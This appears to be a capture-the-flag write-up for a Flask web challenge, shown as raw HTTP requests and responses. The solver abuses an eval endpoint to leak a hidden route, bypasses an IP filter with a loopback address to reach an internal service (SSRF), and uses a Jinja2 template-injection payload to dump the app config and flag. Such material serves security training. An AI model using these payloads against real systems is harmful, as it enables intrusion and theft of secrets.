```
# -*- coding: utf-8 -*-
from flask import Flask, request
import requests
from waf import *
import time
app = Flask(__name__)

@app.route('/ctfhint')
def ctf():
    hint =xxxx # hints
    trick = xxxx # trick
    return trick

@app.route('/')
def index():
    # app.txt
@app.route('/eval', methods=["POST"])
def my_eval():
    # post eval
@app.route(xxxxxx, methods=["POST"]) # Secret
def admin():
    # admin requests
if __name__ == '__main__':
    app.run(host='0.0.0.0',port=8080)
```
==================================================================
```
POST /eval HTTP/1.1
Host: 149.28.226.175:10000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

eval=ctf.func_code.co_consts
```
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 99
Server: Werkzeug/1.0.1 Python/2.7.18
Date: Sat, 29 Aug 2020 12:45:06 GMT

(None, 'the admin route :h4rdt0f1nd_9792uagcaca00qjaf<!-- port : 5000 -->', 'too young too simple')
```
==================================================================
```
POST /eval HTTP/1.1
Host: 149.28.226.175:10000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

eval=admin.func_code.co_consts
```
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 154
Server: Werkzeug/1.0.1 Python/2.7.18
Date: Sat, 29 Aug 2020 12:50:38 GMT

(None, 'ip', 'port', 'path', 'post ip=x.x.x.x&port=xxxx&path=xxx => http://ip:port/path', 4, 'hacker?', 'http://{}:{}/{}', 'timeout', 2, 'requests error')
```
==================================================================
```
POST /eval HTTP/1.1
Host: 149.28.226.175:10000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

eval=index.func_globals
```
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 816
Server: Werkzeug/1.0.1 Python/2.7.18
Date: Sat, 29 Aug 2020 12:44:38 GMT

{'my_eval': <function my_eval at 0x7f0169737dd0>, 'app': <Flask 'app_1'>, 'waf_eval': <function waf_eval at 0x7f0169737c50>, 'admin': <function admin at 0x7f0169681650>, 'index': <function index at 0x7f0169737d50>, 'waf_ip': <function waf_ip at 0x7f0169737b50>, '__builtins__': <module '__builtin__' (built-in)>, 'admin_route': '/h4rdt0f1nd_9792uagcaca00qjaf', '__file__': 'app_1.py', 'request': <Request 'http://149.28.226.175:10000/eval' [POST]>, '__package__': None, 'Flask': <class 'flask.app.Flask'>, 'ctf': <function ctf at 0x7f0169737cd0>, 'waf_path': <function waf_path at 0x7f0169737bd0>, 'time': <module 'time' from '/usr/local/lib/python2.7/lib-dynload/time.so'>, '__name__': '__main__', 'requests': <module 'requests' from '/usr/local/lib/python2.7/site-packages/requests/__init__.pyc'>, '__doc__': None}
```
==================================================================
```
POST /eval HTTP/1.1
Host: 149.28.226.175:10000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

eval=waf_ip.__code__.co_consts
```
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 73
Server: Werkzeug/1.0.1 Python/2.7.18
Date: Sat, 29 Aug 2020 15:01:02 GMT

(None, '0.0', '192', '172', '10.0', '233.233', '1234567890.', 15, '.', 4)
```
==================================================================
```
POST /h4rdt0f1nd_9792uagcaca00qjaf HTTP/1.1
Host: 149.28.226.175:10000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

ip=127.127.127.127&port=5000&path=/
```
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 316
Server: Werkzeug/1.0.1 Python/2.7.18
Date: Sat, 29 Aug 2020 15:10:49 GMT

import flask
from xxxx import flag
app = flask.Flask(__name__)
app.config['FLAG'] = flag
@app.route('/')
def index():
    return open('app.txt').read()
@app.route('/<path:hack>')
def hack(hack):
    return flask.render_template_string(hack)
if __name__ == '__main__':
    app.run(host='0.0.0.0',port=5000)
```
==================================================================
```
POST /h4rdt0f1nd_9792uagcaca00qjaf HTTP/1.1
Host: 149.28.226.175:10000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

ip=127.127.127.127&port=5000&path={{url_for.__globals__['current_app'].__dict__}}
```
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 3012
Server: Werkzeug/1.0.1 Python/2.7.18
Date: Sat, 29 Aug 2020 15:38:43 GMT

{'subdomain_matching': False, 'error_handler_spec': {None: {}}, '_before_request_lock': <thread.lock object at 0x7f66ddf1b410>, 'jinja_env': <flask.templating.Environment object at 0x7f66de123390>, 'before_request_funcs': {}, 'teardown_appcontext_funcs': [], 'shell_context_processors': [], 'after_request_funcs': {}, 'cli': <AppGroup app_2>, '_blueprint_order': [], 'before_first_request_funcs': [], 'view_functions': {'index': <function index at 0x7f66df135e50>, 'static': <bound method Flask.send_static_file of <Flask 'app_2'>>, 'hack': <function hack at 0x7f66de167d50>}, 'instance_path': '/app/web2tokensadfafqgqgfaosvbs/instance', 'teardown_request_funcs': {}, 'logger': <logging.Logger object at 0x7f66de0f3fd0>, 'url_value_preprocessors': {}, 'config': <Config {'JSON_AS_ASCII': True, 'USE_X_SENDFILE': False, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_NAME': 'session', 'MAX_COOKIE_SIZE': 4093, 'SESSION_COOKIE_SAMESITE': None, 'PROPAGATE_EXCEPTIONS': None, 'ENV': 'production', 'DEBUG': False, 'SECRET_KEY': None, 'EXPLAIN_TEMPLATE_LOADING': False, 'MAX_CONTENT_LENGTH': None, 'APPLICATION_ROOT': '/', 'SERVER_NAME': None, 'FLAG': 'GACTF{wuhUwuHu_a1rpl4n3}', 'PREFERRED_URL_SCHEME': 'http', 'JSONIFY_PRETTYPRINT_REGULAR': False, 'TESTING': False, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'TEMPLATES_AUTO_RELOAD': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'JSON_SORT_KEYS': True, 'JSONIFY_MIMETYPE': 'application/json', 'SESSION_COOKIE_HTTPONLY': True, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'TRAP_HTTP_EXCEPTIONS': False}>, '_static_url_path': None, 'template_context_processors': {None: [<function _default_template_ctx_processor at 0x7f66de167550>]}, 'template_folder': 'templates', 'blueprints': {}, 'url_map': Map([<Rule '/' (HEAD, OPTIONS, GET) -> index>,
 <Rule '/static/<filename>' (HEAD, OPTIONS, GET) -> static>,
 <Rule '/<hack>' (HEAD, OPTIONS, GET) -> hack>]), 'name': 'app_2', '_got_first_request': True, 'import_name': '__main__', 'root_path': '/app/web2tokensadfafqgqgfaosvbs', '_static_folder': 'static', 'extensions': {}, 'url_default_functions': {}, 'url_build_error_handlers': []}
 ```